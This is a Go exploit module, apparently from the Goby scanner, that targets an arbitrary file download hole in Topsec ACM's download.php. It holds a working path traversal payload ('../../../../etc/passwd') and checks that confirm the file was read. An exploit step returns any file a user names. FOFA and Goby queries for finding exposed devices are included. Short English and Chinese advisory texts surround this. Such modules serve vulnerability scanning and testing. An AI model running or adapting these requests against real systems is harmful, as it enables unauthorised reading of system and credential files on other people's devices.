package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Topsec ACM download.php Any file download",
    "Description": "<p>Topsec topsec ACM is a professional product of Topsec company for network behavior management and content auditing for all walks of life with years of experience in security product research and development. The system not only has the functions of preventing illegal information dissemination, sensitive information leakage, real-time monitoring, log tracing, network resource management, but also powerful user management, report statistics and analysis functions.</p><p>There is an arbitrary file download vulnerability in the download.php file of TopSec ACM of TopSec ACM, and attackers can use this to read arbitrary files in the system.</p>",
    "Product": "Topsec ACM",
    "Homepage": "http://dtcxdz.com/goods.php?id=3018",
    "DisclosureDate": "2022-09-19",
    "Author": "1105216693@qq.com",
    "FofaQuery": "body=\"dkey_activex_download.php\"",
    "GobyQuery": "body=\"dkey_activex_download.php\"",
    "Level": "2",
    "Impact": "<p>There is an arbitrary file download vulnerability in the download.php file of TopSec ACM of TopSec ACM, and attackers can use this to read arbitrary files in the system.</p>",
    "Recommendation": "<p>At present, the manufacturer has not released patch information, please pay attention to the official website homepage in time for subsequent upgrades and repairs: <a href=\"http://topsec.17ido.com/\">http://topsec.17ido.com/</a></p><p>Temporary advice:</p><p>Filter command injection characters in the filename value passed in by the front end.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filename",
            "type": "input",
            "value": "../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/view/action/download.php?filename=../../../../etc/passwd",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/root:",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/bin/sh",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/view/action/download.php?filename={{{filename}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "天融信 topsec ACM 系统 download.php 任意文件下载",
            "Product": "天融信 topsec ACM",
            "Description": "<p>天融信topsec ACM是天融信公司凭借多年来的安全产品研发经验，为满足各行各业进行网络行为管理和内容审计的专业产品。系统不仅具有防止非法信息传播、敏感信息泄漏，实时监控、日志追溯，网络资源管理，还具有强大的用户管理、报表统计分析功能。</span><span style=\"color: rgb(0, 0, 0); font-size: 14px;\"></span><br></p><p><span style=\"color: rgb(0, 0, 0); font-size: 14px;\"><span style=\"color: rgb(22, 28, 37); font-size: 16px;\"><span style=\"color: rgb(22, 28, 37); font-size: medium;\">天融信TopSec&nbsp; ACM</span>的download.php文件存在任意文件下载漏洞，攻击者可利用此读取系统任意文件。</span></span></p>",
            "Recommendation": "<p>目前厂商暂未发布补丁信息，请及时关注官网主页便于后续升级修复：<a href=\"http://topsec.17ido.com/\">http://topsec.17ido.com/</a></p><p>临时建议：</p><p>过滤前端传入的filename值中命令注入字符。</p>",
            "Impact": "<p>天融信TopSec ACM的download.php文件存在任意文件下载漏洞，攻击者可利用此读取系统任意文件。</span><br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Topsec ACM download.php Any file download",
            "Product": "Topsec ACM",
            "Description": "<p>Topsec topsec ACM is a professional product of Topsec company for network behavior management and content auditing for all walks of life with years of experience in security product research and development. The system not only has the functions of preventing illegal information dissemination, sensitive information leakage, real-time monitoring, log tracing, network resource management, but also powerful user management, report statistics and analysis functions.</p><p>There is an arbitrary file download vulnerability in the download.php file of TopSec ACM of TopSec ACM, and attackers can use this to read arbitrary files in the system.</p>",
            "Recommendation": "<p>At present, the manufacturer has not released patch information, please pay attention to the official website homepage in time for subsequent upgrades and repairs: <a href=\"http://topsec.17ido.com/\">http://topsec.17ido.com/</a></p><p>Temporary advice:</p><p>Filter command injection characters in the filename value passed in by the front end.</p>",
            "Impact": "<p>There is an arbitrary file download vulnerability in the download.php file of TopSec ACM of TopSec ACM, and attackers can use this to read arbitrary files in the system.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10714"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}